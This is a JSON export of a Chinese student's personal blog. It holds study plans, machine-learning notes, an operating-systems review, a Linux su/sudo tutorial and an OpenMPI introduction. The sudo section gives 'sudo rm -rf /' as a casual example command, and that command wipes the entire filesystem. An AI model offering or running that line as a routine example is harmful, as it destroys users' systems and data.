{"meta":{"title":"Rat-racer's Blog","subtitle":null,"description":"stay busy and happy","author":"Lintao Fang","url":"http://yoursite.com"},"pages":[{"title":"书单","date":"2017-10-26T12:51:13.000Z","updated":"2017-10-26T11:39:15.000Z","comments":false,"path":"books/index.html","permalink":"http://yoursite.com/books/index.html","excerpt":"","text":""},{"title":"关于我","date":"2017-10-26T14:16:16.000Z","updated":"2017-10-26T14:16:16.000Z","comments":false,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":"完美主义者，生性懒惰，没什么好介绍的，就一学渣渣，GPA渣渣"},{"title":"友情链接","date":"2017-10-26T14:05:25.000Z","updated":"2017-10-26T11:39:15.000Z","comments":true,"path":"links/index.html","permalink":"http://yoursite.com/links/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2017-10-26T12:51:21.000Z","updated":"2017-10-26T11:39:15.000Z","comments":false,"path":"repository/index.html","permalink":"http://yoursite.com/repository/index.html","excerpt":"","text":""},{"title":"分类","date":"2017-10-26T14:05:18.000Z","updated":"2017-10-26T11:39:15.000Z","comments":false,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2017-10-26T12:53:55.000Z","updated":"2017-10-26T11:39:15.000Z","comments":false,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""},{"title":"资源","date":"2017-10-27T03:52:19.000Z","updated":"2017-10-27T03:52:19.000Z","comments":false,"path":"resources/index.html","permalink":"http://yoursite.com/resources/index.html","excerpt":"","text":""}],"posts":[{"title":"random","slug":"random","date":"2019-07-01T05:00:55.000Z","updated":"2019-07-01T05:48:45.000Z","comments":true,"path":"2019/07/01/random/","link":"","permalink":"http://yoursite.com/2019/07/01/random/","excerpt":"","text":"舒适区 ？逼迫自己去接受学习自己不懂得东西阅读优秀代码，写代码对技术的爱 一点点积累？还是迅速提升！长期高速积累！ 人生苦短 孤燥无味好玩点 搞笑点乐观点 为什么一直吊儿郎当 混 人与人之间都有微妙的关系 好为人师 珍惜好老师珍惜学习机会珍惜同学 端到端 做不到不看长相的境界 从极度铺张浪费到极度节约 从极度兴奋到极度焦虑拖延 早起很爽超越他人看到阳光 问题一定是要个答案吗？ 日光之下没有新鲜事没有新鲜的东西都一样 建筑，交通 服装 都一样 相机 乐器 什么年代不重要，什么样的家庭重要 新的才具有吸引力新知识新的未知新闻新的人，而不是周围的路人普通人常见的新的穿搭新的方案 计划新的。。。任何事物才有吸引力 普通的大多数 没有吸引力 少数的 不普通 才有吸引力 怂不要怂 就是干自信都是小事 态度 为什么我一直肥胖瘦不下来，家庭的影响不一致inconsistent对瘦与胖的理解上所以造成了这样的不一致，但是啊，我最终还是要看外界的理解的所以首先要改变的是理解需要再减20斤 身上还是有一堆肥肉肚子上，大腿 头大身子宽腿壮肚子圆 变强变瘦变dalao 恋旧情怀男人都有？换几个洗面奶 防晒霜T恤 衬衣 鞋包 接受以前所不能接受的 ‘‘自己’眼中的自己颓废，拖延，自闭，不学习，状态不佳，浑浑噩噩‘他们’眼中的我刁钻，自大，狂妄，严格，自闭，孤僻，自强，好学，冷漠，书呆 black book看不见的地带缺失的报道过去一穷二白？一样的，甚至倒退。。。。只关注无产阶级，，，农民，资产阶级，城市呢 娱乐 发达交通 建筑法律 教育 文化国际 关系 交流 原子弹？当今，我的国，贫穷落后 思想 不变 边缘文明吗？ 批发厂家食外卖，小摊，小饭馆，各类餐厅住宾馆从哪里来？？从哪里来到哪里去 别人都很强，都各有优势能力，只有我，啥也没有还学习不进去没有提高的路 一直如此 坚持吃完东西漱口坚持每天早晚刷牙 无时无刻不再变化专注当下 lstm都搞不懂的人深度学习白痴不知道的太多了，知道的太少了这一行有着成千上万的人你能排到哪一号 做到完美做到最好才有价值 回家也就过7，8天而已。还会浪费几天。实际上能学习的时候又有多长时间呢？这段时间怎么安排？算了，不带了，这么多书抱回去，抱回来。太麻烦。回家学Java。C。算法吧。平时的时候就是一个人玩手机，玩电脑，无所事事没有任务没有压力过得挺抑郁，挺颓废的。好像就是闲的。日子一点儿都没有生气， 只有像现在这个样子，有事情逼着你，这样你才会脱离那种状态 但是当自己一个人的时候，却做不到self-motivated 要做的事情还有很多 有那么多知识，需要学习，我什么都不会 有那么多好玩的东西，需要去经历，去了解 自己可以加倍努力成为更好的自己 遇见不同的人 这本来是一件多么欢快的事情多么有意义的生活多么愉快的人生 减肥 减到120-130斤，体型变瘦，纠正过来穿衣搭配，成为一个外在有吸引力的人 大家毕竟都还是看脸的不论男女，不论是谁 内在，‘好好学习，看书，读论文，交流，学术上不差 广泛涉猎人生不设限，不限制自己的专业不限制自己的年龄，领域什么都不限制，尽可能去学习，了解 不要一天到晚玩手机这样使得自己丧失能力，丢掉吸引力 毁了自己去做 目标什么目标成为理想中的自己朝着那个方向去努力！就够了 三和大神 魔幻 与 现实 半吊子，，穷人家学术搞不起来？？ 网上的知识是别人的，不是自己的知识","categories":[],"tags":[]},{"title":"6月计划","slug":"6月计划","date":"2019-06-04T01:54:51.000Z","updated":"2019-06-30T13:23:56.000Z","comments":true,"path":"2019/06/04/6月计划/","link":"","permalink":"http://yoursite.com/2019/06/04/6月计划/","excerpt":"","text":"毕业答辩结束，现在可以全心投入学习了。这个月学完 The foundations of machine learning 统计学习方法 机器学习 周志华 Eliments of Statistical learning Deep Learning 6月4日 今天， 6月5日 肥宅 6月6日 肥宅 6月7日 肥宅 6月8日 肥宅 6月9日 肥宅 6月10日 肥宅 6月11日 肥宅 6月12日 肥宅 6月13日 肥宅 6月14日 今天。。 6月15日 贝叶斯决策理论，， 6月16日 肥宅 6月17日 肥宅 6月18日 《统计学习方法》第十章 :隐马尔科夫模型 HMM , 两个序列，三个参数，两个基本假设，三个基本问题【概率就计算，训练，预测】，其应用 CRF ， 牛顿法，l-bfgs， FTRL , online learning在线学习 SGD，OGD , 6月19日 HMM概率计算三种方法【暴力，前向算法，后向算法】 Parameter Estimation: 点估计？MLE ，MAP ,贝叶斯估计， 什么是似然，为什么极大似然，怎么极大似然？ 贝叶斯估计？估计什么？怎么估计？ p(X,θ):联合分布，p(X|θ)：似然 , p(θ|X)：后验概率，p(θ)：参数先验 p(θ|X) 正比于 p(θ)*p(X|θ) p(θ|X)= p(θ)*p(X|θ)/p(X,θ) MLE,MAP ,贝叶斯估计 区别？ MCMC 区间估计？6666666666666 概率模型？ 复杂系统？ 参考:机器学习中的MLE、MAP、贝叶斯估计 6月20日 MCMC 贝叶斯网，vs. 动态贝叶斯网 概率图模型分类 hierrachy EM算法，及其推广，Q 函数 理解EM算法的九层境界 不要一直半解！ 6月21日 你数学好吗？？？ SVM 回顾复习* 为什么叫支持向量机？什么是支持向量？ * 形式化表达？最大间隔？ * 凸QP问题？KTT条件？拉格朗日？对偶？ * 硬间隔，软间隔 * hinge loss? * 非线性SVM，核函数？正定核？ * SMO? 凸优化 1-3 CRF word2vec: CBOW,SkipGram 6月22日 本科毕业典礼 6月23日 什么是联结主义？ 6月24日 6月25日 6月26日 词集模型，词袋模型，TF-IDF（含义） N-Gram trans-E NER,关系抽取 变分推断 6月27日 end-to-end ? 文本匹配技术： 1970s 向量空间模型VSM: 表示：TF-IDF + 相似性度量 BM25? 缺陷？ 1990s 潜在语义分析LSA：文档-词 矩阵 做SVD分解，不足之处？ 2000s 主题模型Topic Model: LSA-&gt; pLSA -&gt; LDA 2013至今：Deep Learnning,Word2Vec NNLM, CBOW,Skip-Gram, 工具：jieba,gensim,word2vec,fasttext….. 排序模型 三类：pointwise,pairwise,listwise RankNet, MCP-&gt; Peceptron-&gt; MLP -&gt; DNN,CNN,RNN,DRL sigmoid , tanh , relu ？ 梯度消失，梯度爆炸 卷积，池化 LSTM , GRU 6月28日 PageRank 阅读《数学之美》8~15章 NNLM Ensemble Methods：Bagging,Stacking，AdaBoost , Random Forest ， GBDT ，XGBoost 6月29日 BERT 睡觉 6月30日 听讲座 睡觉","categories":[],"tags":[]},{"title":"三年","slug":"三年","date":"2019-05-05T13:10:33.000Z","updated":"2019-05-05T13:36:14.000Z","comments":true,"path":"2019/05/05/三年/","link":"","permalink":"http://yoursite.com/2019/05/05/三年/","excerpt":"19年3月开始。还有研一二两年半的时间来看书，看视频，听课。看paper，听讲座。做实践，写代码。打基础，进前沿。 读完这些书1.算法导论2.Recommeder System Handbook3.数据挖掘导论，数据挖掘概念与技术4.PRML ,ESL ,机器学习，统计学习方法5.Deep Learning ①九章算法 【算法基础，算法强化，动态规划，系统设计】；②算法训练营","text":"19年3月开始。还有研一二两年半的时间来看书，看视频，听课。看paper，听讲座。做实践，写代码。打基础，进前沿。 读完这些书1.算法导论2.Recommeder System Handbook3.数据挖掘导论，数据挖掘概念与技术4.PRML ,ESL ,机器学习，统计学习方法5.Deep Learning ①九章算法 【算法基础，算法强化，动态规划，系统设计】；②算法训练营 把实体书看完。然后卖掉 各领域的牛人，国内外学者历史发展，重要论文 保持motivated，对知识，未知的渴求，热情，渴望学习，不断学习，不断进步，学术方面。生活其他方面，不再闲着，不再有一点抑郁的清晰。对未来充满自信，也很有动力 。想要去践行， 把知乎上，那些先行者的文章， 回答。一些问题都给读完。前人的综述，整理的资源读完。太多了，信息量太大了。 Vision敢想大问题，前沿性问题。真正的大问题才值得投入一辈子去钻研小问题内卷。早被嚼烂。开阔的视野。理论体系 只为了工作只为了就业前景money缺少了什么？passion，curiosity,motivation,敢想敢干，前沿 新的idea？思考方式哲学性革命性开创新的问题 新的问题！未曾研究，想过！！！已经sturdy,换个角度？哲学性！ 阅读：扫读？精读？打印下来精读？读多遍?第一次遇到不熟悉，背景知识，基础差多次阅读直到吃透看完本来就不是很理解再加上时间遗忘白看谨记 张俊林从更抽象的角度看论文，模型 四年目标横扫科大图书馆 ml,dlctr,recsys,CV,nlpkg搜索 花几年时间学好英语词汇，阅读，听力，基本的口语表达 FIF , 新东方，智课网阅读记忆阅读什么","categories":[],"tags":[]},{"title":"五月计划","slug":"五月计划","date":"2019-05-05T11:59:01.000Z","updated":"2019-06-04T01:55:02.000Z","comments":true,"path":"2019/05/05/五月计划/","link":"","permalink":"http://yoursite.com/2019/05/05/五月计划/","excerpt":"一鼓作气，再而衰，三而竭。四月计划只是月初兴奋了几天。后废。。。这个月是大学的最后一个月了。自从三月底考研复试结束加入实验室也已经快一个半月了，从最开始的excited到现在有有点怠惰的迹象。 可千万不能再想以前那样怠惰了，要充实的活着！ 每天/周记录每天做了什么，每周和徐教授沟通，自己这周做了什么。【学习报告&amp;工作进度】 五月份完成毕业论文！ 五月份KDD-Cup进Top100!,进入Phase2 五月份学习其他online资源【4月任务】！+ Books! 减肥！","text":"一鼓作气，再而衰，三而竭。四月计划只是月初兴奋了几天。后废。。。这个月是大学的最后一个月了。自从三月底考研复试结束加入实验室也已经快一个半月了，从最开始的excited到现在有有点怠惰的迹象。 可千万不能再想以前那样怠惰了，要充实的活着！ 每天/周记录每天做了什么，每周和徐教授沟通，自己这周做了什么。【学习报告&amp;工作进度】 五月份完成毕业论文！ 五月份KDD-Cup进Top100!,进入Phase2 五月份学习其他online资源【4月任务】！+ Books! 减肥！ 好了，这一周的任务 昨晚毕设补充实验， 写完初稿 kddcup完成刷分！尝试！不要怕失败！ 广泛学习，写学习报告！ 5月5日 现在已经9点钟了，今天没啥可干的了，那就写论文摘要！ 看学习毕业论文文件，熟悉要求，看模板，熟悉结构 啥事案例分析啊 5月6日 今天还算早起，10点到实验室开始学习。 但是今天昨天还是极度兴奋，今天就是极度焦虑了。 基本没学什么。 只是开了个头，写了一点东西。 5月7日 今天学习了LaTeX基础知识 差不多写完了引言部分 5月8日 今天学了点可视化的东西 做了几张图片,真辛苦 继续写实验部分,写了一部分 还差实验分析 明天把实验部分解决掉!!!吹完 ,相关工作写完.参考文献加上!大功告成!!! 引言再吹嘘一番！吹嘘序列建模！！！ 5月9日 继续写！一个上午就写了一个伪代码！烦！ 晚上效率奇高，写的差不多了， 5月10日 中午完成初稿！ 5月11日 周六 去全椒耍一耍 5月12日 周日 看了刘知远的《大数据智能》 5月13日 新的一周 看了点知识图谱 今天没干啥。。 5月14日 今日任务 生成模型 vs. 判别模型 HMM , BN , MRF , CRF 盘式记法 （plate notation） 5月15日 今天没干啥 学点了降维的东西 明天大改毕业论文！ 5月16日 修改摘要，第一章 5月17日 修改第二章 5月18日 继续改 5月19日 继续改，完毕， 5月20日 今天状态不好，头昏，学习不进去 5月21日 晚上得到修改反馈 5月22日 今天是查重ddl，要赶完！ 5月23日 。。 5月24日 打印论文，以及相关材料 5月25日 肥宅 5月26日 肥宅 5月27日 极客时间-零基础学python 1-21讲 极客时间-趣谈网络协议 开头 5月28日 看了集体智慧编程的几章节 5月29日 5月30日 5月31日","categories":[],"tags":[]},{"title":"四月计划","slug":"四月计划","date":"2019-03-31T16:04:10.000Z","updated":"2019-05-06T02:15:31.000Z","comments":true,"path":"2019/04/01/四月计划/","link":"","permalink":"http://yoursite.com/2019/04/01/四月计划/","excerpt":"在上一篇博客中，我列举了8个阅读来源。分别是 1.知乎关注人物的①回答②文章2.知乎专栏3.MSRA文章 ，其他博客文章4.极客时间专栏①AI技术内参②推荐系统36式等等5.一些微信公众号 ，一些微博，6.一些课程7.中英文paper8.书籍。 在接下来的四月份，以及未来很长的一段时间。我都将要践行。我将在这一篇博客中记录我四月份每一天的学习内容。","text":"在上一篇博客中，我列举了8个阅读来源。分别是 1.知乎关注人物的①回答②文章2.知乎专栏3.MSRA文章 ，其他博客文章4.极客时间专栏①AI技术内参②推荐系统36式等等5.一些微信公众号 ，一些微博，6.一些课程7.中英文paper8.书籍。 在接下来的四月份，以及未来很长的一段时间。我都将要践行。我将在这一篇博客中记录我四月份每一天的学习内容。 4月1日每天阅读三篇文章。听两个专栏。刷掉当日公众号，微博。每本书看20页。看中文文章5篇。英文5篇。每门课看一个module。 1.【极客时间】玩转git三剑客 2.【极客时间】深度学习应用实践 学习1-20讲【张俊林：深度学习在CTR预估的应用】 传统CTR预估 ：LR -&gt; FM -&gt; GBDT -&gt; LR/FM + GBDT 深度学习CTR: MLP , CNN ,RNN ,LSTM FNN , Wide&amp;Deep ,DeepFM ,Deep&amp;Cross , PNN , NFM , AFM Youtube , Alimama , JD 3. 4. 5. 6. 7.","categories":[],"tags":[]},{"title":"那些阅读来源","slug":"那些阅读来源","date":"2019-03-31T15:13:16.000Z","updated":"2019-05-06T02:15:16.000Z","comments":true,"path":"2019/03/31/那些阅读来源/","link":"","permalink":"http://yoursite.com/2019/03/31/那些阅读来源/","excerpt":"信息过载时代，每天面临的的海量的信息使人眼花缭乱，如果没有计划，漫无目的地玩起手机，结果将是看着看着半天就过去了。也不知道究竟收获了什么？？作为一个从现在开始珍惜时间，努力学习的小弱鸡，我不能再想起来那样散漫，没有克制了。从现在开始珍惜时间，把时间花费在有用的信息上。如何找到那些对自己最有用的信息，是一个很重要的问题。这就要讨论几个问题。 信息有效性，是否是我所想要的？✔️ 信息质量，尽管这个问题是我想要的，但是内容质量如何？✔️","text":"信息过载时代，每天面临的的海量的信息使人眼花缭乱，如果没有计划，漫无目的地玩起手机，结果将是看着看着半天就过去了。也不知道究竟收获了什么？？作为一个从现在开始珍惜时间，努力学习的小弱鸡，我不能再想起来那样散漫，没有克制了。从现在开始珍惜时间，把时间花费在有用的信息上。如何找到那些对自己最有用的信息，是一个很重要的问题。这就要讨论几个问题。 信息有效性，是否是我所想要的？✔️ 信息质量，尽管这个问题是我想要的，但是内容质量如何？✔️ 我这段时间在学习ML ,DL ,DM,RecSys, NLP等这方面的知识。这段时间以来关于这些方面的信息是我想要的。那么如何找到这些领域高质量的信息呢。下面是我认为质量比较高的信息来源。也是我平时主要的阅读来源。 1.知乎关注人物的①回答②文章2.知乎专栏3.MSRA文章 ，其他博客文章4.极客时间专栏①AI技术内参②推荐系统36式等等5.一些微信公众号 ，一些微博，6.一些课程7.中英文paper8.书籍。 至于为什么？暂时无暇解释。 以下是更细致的内容。 1.知乎关注人物的①回答②文章 高水平任务，高质量回答/文章。 2.知乎专栏 知乎上云集着大量的IT从业者，其中也不乏AI爱好者。应该算是全[中文]网上信息量最大的了。 我关注了一批高质量的知乎专栏。 3.极客时间专栏①AI技术内参②推荐系统36式等等 我是一个收藏爱好者，平时喜欢在网上找一些网上的课程看看，就我观察来看，在所有的网上课程中，极客时间算是质量最高的之一了。 极客时间大概有四五十个专栏，这些专栏中大多数质量极佳，只有一些质量相对不好。在所有专栏中涉及AI领域的，大概有几个。 分别是①AI技术内参②推荐系统三十六式③机器学习四十讲④人工智能基础课⑤数据分析45讲。这些课程分别优缺点是什么？质量如何?那些值得看？ 如何获取。①正版购买，土豪随意。②咸鱼上购买盗版视频，大概￥10以内可以买到全套视频。对于我这些穷苦学生只能如此了，实在无力正版买专栏。我只是在最开始的时候花一百多买过两个专栏，也算是对极客时间做贡献了。 3.MSRA文章 ，其他博客文章 私人博客。 张俊林： csdn博客118篇+知乎文章14篇 推荐系统遇上深度学习 35篇 5.一些微信公众号 ，一些微博6.一些课程 Coursera cs229 , cs230 7.中英文paper arXiv 数据分析与知识发现 8.书籍。","categories":[],"tags":[]},{"title":"","slug":"算法笔试解答","date":"2018-05-11T06:15:36.000Z","updated":"2018-07-03T08:40:12.000Z","comments":true,"path":"2018/05/11/算法笔试解答/","link":"","permalink":"http://yoursite.com/2018/05/11/算法笔试解答/","excerpt":"","text":"一·选择题 1.C2.D3.B4.A 二·编程题1,使用im2col方法来将卷积转换为矩阵相乘，性能更佳2. C/C++实现 int MaxSub(const char * array , int len ){ int curSum = 0,maxSum = 0; for( int i = 0 ; i &lt; len ;i++){ curSum += array[i]; maxSum = curSum&gt;maxSum ? curSum : maxSum; if(curSum &lt; 0) curSum = 0; } return maxSum; } 3. 4.Rondom forest1. D = {(x1,x2)…………………………(xm,ym)} For i=1,2,,,K 1.从属性集feature set中随机选择k属性,作为属性子集f_k 2.选择最优属性进行划分 3.继续分裂， 4.重复1-3，直至终止条件以生成一棵树 共生成k棵树 欠拟合，参数过于简单，未能较好的拟合。未能捕捉到样本的趋势，过拟合在训练集以及测试机上都有较大的误差。过拟合，参数过于复杂，过度拟合。过度拟合训练样本。过拟合在训练集上有较小的误差，但是在测试集上有较大误差 3.随机森林一般情况下不容易过拟合。因为现实世界中，数据是有噪声的，采用较少棵的树容易过拟合。增加树的数量可以减少过拟合。","categories":[],"tags":[]},{"title":"操作系统Review","slug":"操作系统Review","date":"2018-05-04T18:32:51.000Z","updated":"2018-05-06T13:47:55.000Z","comments":true,"path":"2018/05/05/操作系统Review/","link":"","permalink":"http://yoursite.com/2018/05/05/操作系统Review/","excerpt":"","text":"Operating Systems Review I/O 软件 系统 I/O控制 轮询 流程？弊端 中断 什么是中断？中断处理流程？多重？抢占？弊端 DMA 流程？ Spooling 什么是假脱机 ？ 假脱机 vs 脱机？ 组成部分 工作原理：假脱机打印机 特点 (虚拟？why spooling?) Buffer Why buffer? Single , double, circle ,buffer pool 作用 磁盘调度 磁盘访问时间 = 寻道时间 + 旋转延迟 + 传输时间 FCFS , SSJF , SCAN , C-SCAN , N-Setp-SCAN , FSCAN 算法流程 利弊？如何选择？ SCAN适用于磁盘负荷大 SSJF(平均寻道时间最短) 饥饿( FCFS , SSJF ) -&gt; 解决饥饿( SCAN,C-SCAN ） SCAN -&gt; C-SCAN (减少等待时间) 解决磁壁粘着(N-Setp-SCAN,FSCAN(简化版N-step)) 设备独立性 1 2 3 操作系统Intro OS 目标，作用，发展动力 发展历史 无操作系统(人工操作 -&gt; 脱机IO ) -&gt; 单道批处理系统 -&gt; 多道批处理系统 -&gt; 分时系统，实时系统 什么是脱机IO ？why? 解决人机矛盾以及CPU，IO速度不匹配 什么是人机矛盾？ 文件系统 什么是文件？目录 ？文件的逻辑结构？组织结构？目录结构？ 分配方法及其优缺点 连续分配 随机访问 外部碎片&amp;大小声明 链式分配 隐式链接 无外部碎片&amp;大小可变 随机访问&amp;指针占用空间 显示链接 无外部碎片&amp;%大小可变&amp;随机访问 链接表占用空间 索引分配&amp;多级索引 随机访问&amp;外部碎片&amp;大小可变 索引表占空间&amp;一级索引文件大小受限 增量式多级索引 unix采用 FAT NTFS 空闲空间管理 Bit Vector Linked List Grouping Count RAID 各级别 提高可靠性 数据一致性 Memory 管理 链接，装载 连续内存分配 单一，固定分区，动态分区 动态分区 数据结构 空闲分区表 分配算法 first fit , next fit , best fit , worst fit 回收 覆盖 Overlay 将不会同时同时运行的程序段共享一块内存，by programmer 紧凑（compaction） Compaction is possible only if relocation is dynamic, and is done at execution time (运行时的动态可重定位技术) 对换（swap） 离散内存分配 分段 分页 段页式 虚拟内存 进程间通信 死锁 I/O System一无所知还写。我tmD的真的是一无所知，什么都不知道。辣鸡。误人子弟。 计算机的两大任务就是 计算 与 I/O操作。 在冯诺依曼体系结构中，计算机有五大部件，分别是运算器，控制器,主存，输入系统，输出系统组成。 对于主存，需要频繁的进行读，写操作，可以将其看作是一种特殊的I/O设备。因此不严格地说，这五大部件可以分为CPU(运算器，控制器)，I/O设备。计算机在运行时，需要与I/O进行交互。譬如当你浏览网页时，需要用鼠标点击或者是使用触控板。当你编辑时，需要使用键盘来键入。需要计算机的任务(job)可以大致分为两种类型，一种是I/O密集型，即需要频繁大量的I/O操作，一种是CPU密集型，即需要大量的运算。 I/O设备层出不穷，各式各样。 计算机的任务是让用户能够使用这些I/O设备。更好的是，能让用户方便的使用，高效的使用这些设备。 譬如说，对于磁盘读写而言、 典型的磁盘读写需要用磁头进行操作，先让磁头移动到指定的位置，然后进行读或者写。 这是一个非常底层的工作，如果用户进行磁盘读写时需要自己操作磁头，这将是一个多么恐怖的事情。 可用性 Availability 因此为了让用户能够使用这些设备。我们需要对底层进行抽象，隐藏。 可以添加以磁盘控制器Controller，每次需要读写的时候，只需要向磁盘控制器发送一个信号就可以了。 这个信号可能包括指令(读，还是写)，地址(在哪里写)，数据(写什么数据)。然后磁盘控制器可以操作磁头完成用户的这些请求操作。 控制器Controller应该算是一个硬件设备。完成可用性的应该是计算机组成原理等底层硬件的相关技术。 事实上，对于所有的I/O设备而言，都尤其对应的控制器，来隐藏底层，向上层提供一个接口，用户只需要提供一个接口就可以使用这些设备。 易用性与高效性 完成了可用性的工作，接下来的目标便是高效的完成I/O操作。 一方面，我们可以降低I/O操作的时延，即能够快速响应。 另一方面，我们可以增加不同设备间的并行性，让不同的设备可以并行地进行工作。 为了更加方便的使用IO设备，完成IO操作，需要进一步进行抽象，隐藏底层。 磁盘读写操作而言，CPU通过总线向磁盘contrller发送信号。然后磁盘完成相应的操作。 可以进一步封装为read(),write()操作，用户在编程是可以直接调用这样的接口。 进一步抽象，用户只需要提供read(filename),或者write(filename,data)即可完成相应的操作。接下来的操作由CPU，和磁盘控制器来完成。 1、轮询 2、终端 3、DMA 4、通道 操作系统在I/O方面的作用是管理和控制I/O操作和设备。 可拓展性 Scalability","categories":[],"tags":[]},{"title":"程序的链接与装载","slug":"程序的链接与装载","date":"2018-05-04T18:31:31.000Z","updated":"2018-05-06T13:46:02.000Z","comments":true,"path":"2018/05/05/程序的链接与装载/","link":"","permalink":"http://yoursite.com/2018/05/05/程序的链接与装载/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"linux-指令Review","slug":"linux-指令复习","date":"2018-05-04T08:25:51.000Z","updated":"2018-05-06T13:46:04.000Z","comments":true,"path":"2018/05/04/linux-指令复习/","link":"","permalink":"http://yoursite.com/2018/05/04/linux-指令复习/","excerpt":"","text":"1 进程相关 1.1 ps top pstree kill 1.2 bg fg &amp; Ctrl+Z 2 用户相关 2.1 用户基本basics 2.2 su sudo 3 查询 grep 进程相关1.1 ps top pstree killpsps (pocess status),查看进程状态 ,所查看的状态是静态的，是查询时间瞬时的状态。 top动态地状态。 kill利用grep查询1.2 bg fg &amp; Ctrl+Z什么是前台，后台？相对于终端？ jobs列出后台挂起和运行的程序 command + &amp; -&gt; 后台运行前台运行 + Ctrl Z -&gt;后台-挂起后台-挂起 + bg %num - &gt; 后台-运行后台 + fg %num -&gt;前台 终端关闭后仍运行Linux 技巧：让进程在后台可靠运行的几种方法 nohupsetsid&amp;disownscreen2.1 用户基本basicsLinux是一个多用户操作系统，我们需要以一个身份登录，一个系统也需要以一个身份运行。 不同的用户有着不同的权限，这样可以通过限制用户的权限来达到管理资源与权限的目的。 每一个用户都有一个UID，即user id. 每一个用户都属于一个主组，一个或者多个附属组。 每个组拥有一个GroupID。 每个进程以一个用户身份运行，并受该用户可访问的资源限制。 每个可登录用户拥有一个指定的shell。 用户分为以下三种: root用户 (ID为0的用户为root用户) 系统用户 (1 – 499 非强制，而是惯例) 普通用户 (500以上) 系统中的文件都有一个所属用户及所属组。 查看用户信息 使用id命令可以显示当前用户的信息。 命令whoami显示当前用户名 命令who显示有哪些用户已经登录系统 命令w显示有哪些用户已经登录并且在干什么 使用passwd命令可以修改当前用户密码。 可以通过useradd创建，usermod修改与userdel删除用户 可以通过groupadd创建，groupmod修改，groupdel删除组 配置文件 /etc/passwd /etc/shadow 详细信息可参见linux用户和用户组管理-Runoob 2.2 su vs sudo2.2.1 su做什么？su和sudo是经常容易弄混的两个命令。我们知道，root用户具有全部权限，然而普通用户只有部分权限。譬如普通用户不可以..。为了能够执行这些需要这些权限的命令，就需要获得超级用户权限。 su,sudo两者相同的地方在于都可以通过获得超级用户(superuser , or root , or admin on windows.)权限来执行一些受限操作。 su 命令的作用是切换用户(switch user)。其后接用户名，即可切换至该用户。 直接su命令不接用户则默认切换至root用户。（需要输入目标用户的密码，Ubuntu Linux密码记忆时间为15分钟5，Mac OSX为5分钟） 切换到目标用户后，可使用exit,或者logout命令来注销该用户，然后返回到原用户。 查看su文档如下 名称 su - 更改用户 ID 或成为超级用户 大纲 su [选项] [用户名] 描述 su 用于让用户在登录期间变成另外一个用户。后边不带 username 使用时，su 默认会变成超级用户。可选的选项 ...... 选项 ..... .... 2.2.2 sudo做什么？ sudo 命令的作用是用超级用户权限执行单个命令. 需要输入当前用户密码 eg: $ sudo rm -rf / sudo -i为了频繁的执行某些只有超级用户才能执行的权限，而不用每次输入密码，可以使用该命令、执行该命令后提示符变为“#”而不是“$” sudo susudo su即以超级用户权限运行su命令(切换至root用户)，因为sudo命令是输入当前用户密码。所以在不知道root用户密码的情况下，可以使用该命令切换至root用户，但是只需要当前用户的密码。 2.2.3 su与sudo的区别 [1] su stands for switch (or substitute) user. With no user name given, it defaults to switching to root. It prompts for the password of the user you&apos;re switching to. sudo is used to run a command as root (i.e., with root permissions), or as other users. It prompts for your password, and checks that you&apos;re allowed to use sudo. [2] 扩展阅读一:Linux下 su命令与su - 命令有什么区别？ su 是切换到其他用户，但是不切换环境变量（比如说那些export命令查看一下，就知道两个命令的区别了） su - 是完整的切换到一个用户环境 所以建议大家切换用户的时候,尽量使用 su - linuxso 这样 否则可能发现某些命令执行不了 扩展阅读二:su和sudo的区 别 由于su 对切换到超级权限用户root后，权限的无限制性，所以su并不能担任多个管理员所管理的系统。如果用su 来切换到超级用户来管理系统，也不能明确哪些工作是由哪个管理员进行的操作。特别是对于服务器的管理有多人参与管理时，最好是针对每个管理员的技术特长和 管理范围，并且有针对性的下放给权限，并且约定其使用哪些工具来完成与其相关的工作，这时我们就有必要用到 sudo。 通过sudo，我们能把某些超级权限有针对性的下放，并且不需要普通用户知道root密码，所以sudo 相对于权限无限制性的su来说，还是比较安全的，所以sudo 也能被称为受限制的su ；另外sudo 是需要授权许可的，所以也被称为授权许可的su； sudo 执行命令的流程是当前用户切换到root（或其它指定切换到的用户），然后以root（或其它指定的切换到的用户）身份执行命令，执行完成后，直接退回到当前用户；而这些的前提是要通过sudo的配置文件/etc/sudoers来进行授权； References[1] sudo-su-vs-su-linux [2] su External Linkshow-use-sudo-and-su-commands-linux-introduction","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"","slug":"未命名文件夹/UFLDL学习记录","date":"2018-04-26T07:35:08.000Z","updated":"2018-05-06T13:46:07.000Z","comments":true,"path":"2018/04/26/未命名文件夹/UFLDL学习记录/","link":"","permalink":"http://yoursite.com/2018/04/26/未命名文件夹/UFLDL学习记录/","excerpt":"","text":"稀疏自编码器什么是稀疏自编码器？ sparse auto-encoder? 神经网络反向传导算法梯度检验与高级优化自编码算法与稀疏性可视化自编码器训练结果稀疏自编码器符号一览表Exercise:Sparse Autoencoder","categories":[],"tags":[]},{"title":"OpenMPI入门","slug":"openmp入门","date":"2018-04-26T05:36:31.000Z","updated":"2018-05-06T13:47:42.000Z","comments":true,"path":"2018/04/26/openmp入门/","link":"","permalink":"http://yoursite.com/2018/04/26/openmp入门/","excerpt":"","text":"MPI即Message Passing Interface、 消息传递Message Passing是进程间通信的一种方式。回顾一下操作系统的知识，进程间通信IPC主要有两种模型，一种是共享内存shared memory。另外一种便是消息传递Message Passing. 1.MPI 2.基于消息传递的并行编程 3.6个基本函数 4.MPI HelloWorld 5.点对点通信 6.集群通信 MPI MPI是一个消息传递接口标准，(而不是指对它的实现)。 有很多MPI的实现，MPICH,MVAPICH,OpenMP,Intel MPI等。 MPI支持对C/C++,和Fortran语言的绑定 MPI已语言独立的形式存在，可以运行在不同的操作系统和硬件平台上。 OpenMPI是MPI的一个开源实现，支持标准MPI2.2.使用OpenMPI我们可以方便的编写基于消息传递的并行程序。 基于消息传递的并行编程在基于消息传递的并行编程模型中，每个进程都有一个独立的地址空间，一个进程不能直接访问其他进程中的数据。使用消息传递来实现进程间的通信。用户需要显式的通过发送和接受消息来实现处理器之间的数据交换。 这种编程方式适用于MPP,Cluster.使用消息传递的开销比较大，因此它主要用来开发大粒度和粗粒度的并行性。 